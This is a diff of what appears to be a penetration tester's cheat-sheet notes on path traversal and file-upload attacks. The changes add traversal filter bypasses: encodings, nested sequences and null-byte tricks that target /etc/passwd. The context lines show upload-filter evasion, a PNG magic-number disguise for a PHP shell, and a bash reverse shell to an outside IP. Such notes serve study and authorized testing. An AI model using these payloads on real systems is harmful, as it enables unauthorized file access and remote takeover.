@@ -22,7 +22,7 @@ Google the http-title
 `searchsploit /path/to/exploit -x`
 - view exploit
 
-#### File Inclusion LFI RFI
+#### Path Traversal File Inclusion LFI RFI
 ?param=
 ```
 ../../../../../etc/passwd
@@ -33,6 +33,10 @@ Google the http-title
 ```
 - windows
 - also sometimes forward slashes work `../../../../../../Windows/boot.ini`
+- nested traversal sequences, such as `....//` or `....\/`
+- URL encoding `../` = `%2e%2e%2f` and double URL encoding = `%252e%252e%252f` non-standard encodings, such as `..%c0%af` or `..%ef%bc%8f`
+- may require the user-supplied filename to start with the expected base folder, such as `filename=/var/www/images/../../../etc/passwd`
+- may require the user-supplied filename to end with an expected file extension, such as .png, for ex: `filename=../../../etc/passwd%00.png`
 ###### Second-Order LFI attack
 - if you also have ability to create a user account & access a URL subdirectory that contains your username, try naming the account "../../../etc/passwd" then accessing that URL
 	- might need to use null bye injection or other bypass to end string if subdirectory of URL isn't end of URL
@@ -55,7 +59,7 @@ AddType application/x-httpd-php .jpeg
 AddType application/x-httpd-php .png
 AddType application/x-httpd-php .gif
 ```
-- Content-Type
+- ##### Content-Type
 	- If expecting an image file, set Content-Type to image/jpeg or image/png and upload a php file
 	- remove Content-Type and see if server defaults to a certain type
 - Null byte injection
@@ -81,7 +85,7 @@ cp dank.php dank.php.jpg
 bash -c 'bash -i >%26 /dev/tcp/10.10.14.172/443 0>%261'
 ```
 - or other shells
-Magic Number
+##### Magic Number
 ```
 printf '\x89PNG\r\n\x1A\n' | cat - shell.php > shell.png
 ```
